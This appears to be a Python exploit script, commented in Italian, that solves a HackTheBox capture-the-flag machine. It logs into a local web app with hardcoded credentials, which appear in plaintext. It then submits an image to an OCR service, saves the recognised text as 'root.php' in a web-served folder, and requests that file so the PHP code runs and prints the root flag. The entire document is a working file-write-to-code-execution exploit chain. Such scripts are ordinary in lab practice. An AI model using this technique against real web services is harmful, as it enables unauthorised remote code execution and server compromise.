import base64
import requests
from bs4 import BeautifulSoup

# Configurazione target e credenziali
TARGET_URL = "http://127.0.0.1:8001"  # Modifica se l'IP è diverso (es. l'IP della macchina HTB)
USERNAME = "walter"
PASSWORD = "JbhHDAEgXvri3!"
IMAGE_PATH = "/home/ale/Scrivania/MakeSense_HTB/codici/root.png"

# Inizializza la sessione HTTP (gestisce automaticamente cookie e auth)
session = requests.Session()
session.auth = (USERNAME, PASSWORD)

print("[*] Codifica dell'immagine root.png in Base64...")
try:
    with open(IMAGE_PATH, "rb") as img_file:
        b64_data = base64.b64encode(img_file.read()).decode("utf-8")
    canvas_image = f"data:image/png;base64,{b64_data}"
except FileNotFoundError:
    print(f"[-] Errore: Il file '{IMAGE_PATH}' non è stato trovato nella cartella corrente.")
    exit(1)

# --- STEP 1: Invio dell'immagine per il riconoscimento OCR ---
print("[*] Invio dell'immagine al servizio OCR (Step 1)...")
payload_step1 = {"canvas_image": canvas_image}
response_step1 = session.post(f"{TARGET_URL}/", data=payload_step1)

if response_step1.status_code != 200:
    print(f"[-] Errore nello Step 1 (Status Code: {response_step1.status_code})")
    exit(1)

# Estrazione dell'ocr_id dal codice HTML della pagina
soup = BeautifulSoup(response_step1.text, "html.parser")

# Cerca l'ID nel valore di un input hidden o nel testo (adatta in base alla struttura della pagina)
ocr_id_input = soup.find("input", {"name": "ocr_id"})
if ocr_id_input and ocr_id_input.get("value"):
    ocr_id = ocr_id_input.get("value")
else:
    # Tentativo di recupero alternativo se l'ID è stampato nel testo o in un altro tag
    print("[-] Impossibile trovare l'input ocr_id. Analizzo il testo della risposta...")
    # Se fallisce la ricerca automatica, potresti dover stampare response_step1.text per vedere dove si trova l'ID
    ocr_id = None
    for text in soup.stripped_strings:
        if "ocr_" in text:
            # Pulisce la stringa per isolare l'ID se necessario
            ocr_id = text
            break

if not ocr_id:
    print("[-] Errore: Impossibile trovare l'ocr_id nella risposta del server.")
    print("[*] Ecco il testo ricevuto per debug:")
    print(response_step1.text[:500])  # Stampa i primi 500 caratteri per controllo
    exit(1)

print(f"[+] OCR_ID individuato con successo: {ocr_id}")

# --- STEP 2: Salvataggio del testo riconosciuto come file PHP ---
print("[*] Richiesta di salvataggio del file come 'root.php' (Step 2)...")
payload_step2 = {
    "ocr_id": ocr_id,
    "filename": "root.php",
    "save_output": "Save"
}
response_step2 = session.post(f"{TARGET_URL}/", data=payload_step2)

if "saved/root.php" in response_step2.text.lower() or response_step2.status_code == 200:
    print("[+] File salvato correttamente in 'saved/root.php'!")
else:
    print("[-] Il server potrebbe non aver salvato il file. Verificare l'output.")

# --- STEP 3: Esecuzione del file PHP e lettura della Flag ---
print("[*] Trigger del file PHP per leggere la flag di root (Step 3)...")
trigger_url = f"{TARGET_URL}/saved/root.php"
response_final = session.get(trigger_url)

print("\n[+] RISULTATO DI ROOT:")
print("-" * 40)
print(response_final.text.strip())
print("-" * 40)
